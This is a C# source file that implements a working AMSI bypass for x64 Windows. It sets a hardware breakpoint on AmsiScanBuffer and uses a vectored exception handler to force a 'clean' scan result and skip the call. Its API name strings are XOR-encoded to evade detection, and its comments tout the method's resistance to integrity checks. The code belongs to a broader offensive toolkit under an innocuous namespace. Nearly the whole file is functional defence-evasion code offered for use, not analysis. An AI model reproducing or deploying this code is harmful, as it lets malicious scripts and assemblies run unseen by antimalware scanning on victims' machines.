using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    /// <summary>
    /// Hardware Breakpoint AMSI bypass using VEH + DR registers.
    /// Sets a hardware execution breakpoint on AmsiScanBuffer entry.
    /// When the breakpoint fires, the VEH handler skips the function
    /// and returns AMSI_RESULT_CLEAN — no memory patching required.
    ///
    /// Advantages over memory patching (Ctx.Run):
    ///   - No modification of code pages (bypasses integrity checks)
    ///   - No VirtualProtect(RWX) calls on amsi.dll
    ///   - Uses legitimate OS debugging facility
    ///   - Resilient to periodic integrity scans of AMSI code pages
    ///
    /// Scope: in-process AMSI calls only (Assembly.Load, hosted
    /// PowerShell, etc.). Child processes have their own address
    /// space — use Ctx.IS for per-command shell bypass.
    /// </summary>
    internal static class AmsiHwBp
    {
        // ── String encoding ────────────────────────────────────────

        private static readonly byte[] _xk = { 0x91, 0x3C, 0xA7, 0x5B, 0xE8 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Encoded: "amsi.dll"
        private static readonly byte[] _sAmsi =
            { 0xF0, 0x51, 0xD4, 0x32, 0xC6, 0xF5, 0x50, 0xCB };

        // Encoded: "AmsiScanBuffer"
        private static readonly byte[] _sFunc =
            { 0xD0, 0x51, 0xD4, 0x32, 0xBB, 0xF2, 0x5D, 0xC9,
              0x19, 0x9D, 0xF7, 0x5A, 0xC2, 0x29 };

        // Encoded: "kernel32.dll"
        private static readonly byte[] _sK32 =
            { 0xFA, 0x59, 0xD5, 0x35, 0x8D, 0xFD, 0x0F, 0x95,
              0x75, 0x8C, 0xFD, 0x50 };

        // Encoded: "AddVectoredExceptionHandler"
        private static readonly byte[] _sVeh =
            { 0xD0, 0x58, 0xC3, 0x0D, 0x8D, 0xF2, 0x48, 0xC8,
              0x29, 0x8D, 0xF5, 0x79, 0xDF, 0x38, 0x8D, 0xE1,
              0x48, 0xCE, 0x34, 0x86, 0xD9, 0x5D, 0xC9, 0x3F,
              0x84, 0xF4, 0x4E };

        // Encoded: "GetThreadContext"
        private static readonly byte[] _sGetCtx =
            { 0xD6, 0x59, 0xD3, 0x0F, 0x80, 0xE3, 0x59, 0xC6,
              0x3F, 0xAB, 0xFE, 0x52, 0xD3, 0x3E, 0x90, 0xE5 };

        // Encoded: "SetThreadContext"
        private static readonly byte[] _sSetCtx =
            { 0xC2, 0x59, 0xD3, 0x0F, 0x80, 0xE3, 0x59, 0xC6,
              0x3F, 0xAB, 0xFE, 0x52, 0xD3, 0x3E, 0x90, 0xE5 };

        // ── Delegate types ─────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int VehCallback(IntPtr pExInfo);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr DAddVeh(uint first, IntPtr handler);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DGetThreadContext(IntPtr hThread, IntPtr lpContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DSetThreadContext(IntPtr hThread, IntPtr lpContext);

        // ── Constants ──────────────────────────────────────────────

        private const int EXCEPTION_CONTINUE_EXECUTION = -1;
        private const int EXCEPTION_CONTINUE_SEARCH = 0;
        private const uint EXCEPTION_SINGLE_STEP = 0x80000004;

        // CONTEXT offsets (x64 Windows)
        private const int CTX_FLAGS = 0x30;
        private const int CTX_DR0   = 0x48;
        private const int CTX_DR7   = 0x70;
        private const int CTX_RAX   = 0x78;
        private const int CTX_RSP   = 0x98;
        private const int CTX_RIP   = 0xF8;
        private const int CTX_SIZE  = 0x4D0; // 1232 bytes

        // CONTEXT flags
        private const uint CONTEXT_AMD64            = 0x00100000;
        private const uint CONTEXT_DEBUG_REGISTERS  = 0x00000010;

        // ── State ──────────────────────────────────────────────────

        private static IntPtr _targetAddr;
        private static bool _installed;
        private static VehCallback _callback; // prevent GC collection

        // ── Cached delegates ───────────────────────────────────────

        private static DGetThreadContext _getCtx;
        private static DSetThreadContext _setCtx;

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Install hardware breakpoint AMSI bypass.
        /// Loads amsi.dll, registers a VEH, and sets DR0 on the
        /// current thread to intercept AmsiScanBuffer calls.
        /// Thread-safe, idempotent — subsequent calls return true
        /// immediately.
        /// </summary>
        public static bool Install()
        {
            if (_installed)
                return true;

            try
            {
                // 1. Load amsi.dll and resolve AmsiScanBuffer
                IntPtr hAmsi = W.M0(D(_sAmsi));
                if (hAmsi == IntPtr.Zero)
                    return false;

                _targetAddr = W.M1(hAmsi, D(_sFunc));
                if (_targetAddr == IntPtr.Zero)
                    return false;

                // 2. Resolve kernel32 APIs
                IntPtr hK32 = W.M0(D(_sK32));
                if (hK32 == IntPtr.Zero)
                    return false;

                IntPtr pAddVeh = W.M1(hK32, D(_sVeh));
                IntPtr pGetCtx = W.M1(hK32, D(_sGetCtx));
                IntPtr pSetCtx = W.M1(hK32, D(_sSetCtx));

                if (pAddVeh == IntPtr.Zero ||
                    pGetCtx == IntPtr.Zero ||
                    pSetCtx == IntPtr.Zero)
                    return false;

                var addVeh = (DAddVeh)
                    Marshal.GetDelegateForFunctionPointer(
                        pAddVeh, typeof(DAddVeh));
                _getCtx = (DGetThreadContext)
                    Marshal.GetDelegateForFunctionPointer(
                        pGetCtx, typeof(DGetThreadContext));
                _setCtx = (DSetThreadContext)
                    Marshal.GetDelegateForFunctionPointer(
                        pSetCtx, typeof(DSetThreadContext));

                // 3. Register VEH as first handler
                _callback = OnException;
                IntPtr pFunc = Marshal.GetFunctionPointerForDelegate(
                    _callback);

                IntPtr hVeh = addVeh(1, pFunc);
                if (hVeh == IntPtr.Zero)
                    return false;

                // 4. Set hardware breakpoint DR0 on current thread
                if (!SetDr0(_targetAddr))
                    return false;

                _installed = true;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── VEH callback ───────────────────────────────────────────

        /// <summary>
        /// Vectored Exception Handler.
        /// Intercepts hardware breakpoint on AmsiScanBuffer, sets
        /// AMSI_RESULT to CLEAN, returns S_OK, and skips the call.
        /// </summary>
        private static int OnException(IntPtr pExInfo)
        {
            // EXCEPTION_POINTERS: [0]=PEXCEPTION_RECORD [8]=PCONTEXT
            IntPtr pRecord  = Marshal.ReadIntPtr(pExInfo, 0);
            IntPtr pContext = Marshal.ReadIntPtr(pExInfo, 8);

            // Only handle STATUS_SINGLE_STEP (hardware breakpoint)
            uint code = (uint)Marshal.ReadInt32(pRecord, 0);
            if (code != EXCEPTION_SINGLE_STEP)
                return EXCEPTION_CONTINUE_SEARCH;

            // Verify RIP matches our target
            long rip = Marshal.ReadInt64(pContext, CTX_RIP);
            if (rip != _targetAddr.ToInt64())
                return EXCEPTION_CONTINUE_SEARCH;

            // ── AmsiScanBuffer intercepted ─────────────────────────
            //
            // HRESULT AmsiScanBuffer(
            //   HAMSICONTEXT  ctx,      // RCX
            //   PVOID         buf,      // RDX
            //   ULONG         len,      // R8
            //   LPCWSTR       name,     // R9
            //   HAMSISESSION  session,  // [RSP+0x28]
            //   AMSI_RESULT  *result    // [RSP+0x30]
            // );

            try
            {
                long rsp = Marshal.ReadInt64(pContext, CTX_RSP);
                IntPtr stackBase = new IntPtr(rsp);

                // Read 6th param: pointer to AMSI_RESULT
                IntPtr pResult = Marshal.ReadIntPtr(stackBase, 0x30);

                // Write AMSI_RESULT_CLEAN (0)
                if (pResult != IntPtr.Zero)
                    Marshal.WriteInt32(pResult, 0);

                // Return value = S_OK (0)
                Marshal.WriteInt64(pContext, CTX_RAX, 0);

                // Skip function: RIP = return address from stack
                long retAddr = Marshal.ReadInt64(stackBase, 0);
                Marshal.WriteInt64(pContext, CTX_RIP, retAddr);

                // Simulate RET: RSP += 8
                Marshal.WriteInt64(pContext, CTX_RSP, rsp + 8);
            }
            catch
            {
                // Stack read failed — still continue execution
                // to avoid crashing the process
            }

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        // ── DR0 setup ──────────────────────────────────────────────

        /// <summary>
        /// Set DR0 execution breakpoint on the current thread.
        /// Uses GetThreadContext / SetThreadContext with the
        /// pseudo-handle for the current thread.
        /// </summary>
        private static bool SetDr0(IntPtr addr)
        {
            // GetCurrentThread pseudo-handle = -2
            IntPtr hThread = new IntPtr(-2);

            // Allocate CONTEXT via VirtualAlloc for 16-byte alignment
            IntPtr pCtx = W.MC(
                IntPtr.Zero, (UIntPtr)CTX_SIZE,
                0x3000, 0x04); // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE

            if (pCtx == IntPtr.Zero)
                return false;

            try
            {
                // Zero out the structure
                unsafe
                {
                    byte* p = (byte*)pCtx.ToPointer();
                    for (int i = 0; i < CTX_SIZE; i++)
                        p[i] = 0;
                }

                // Set ContextFlags for debug registers
                Marshal.WriteInt32(pCtx, CTX_FLAGS,
                    (int)(CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS));

                // Get current thread context
                if (!_getCtx(hThread, pCtx))
                    return false;

                // DR0 = target address (execution breakpoint)
                Marshal.WriteInt64(pCtx, CTX_DR0, addr.ToInt64());

                // DR7: enable DR0 local breakpoint
                //   Bit  0   = L0 (local enable for DR0)
                //   Bits 16-17 = R/W0 (00 = execution)
                //   Bits 18-19 = LEN0 (00 = 1 byte)
                long dr7 = Marshal.ReadInt64(pCtx, CTX_DR7);
                dr7 |= 1L;           // Set L0
                dr7 &= ~(0xFL << 16); // Clear R/W0 and LEN0
                Marshal.WriteInt64(pCtx, CTX_DR7, dr7);

                // Apply modified context
                if (!_setCtx(hThread, pCtx))
                    return false;

                return true;
            }
            finally
            {
                W.MD(pCtx, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            }
        }
    }
}
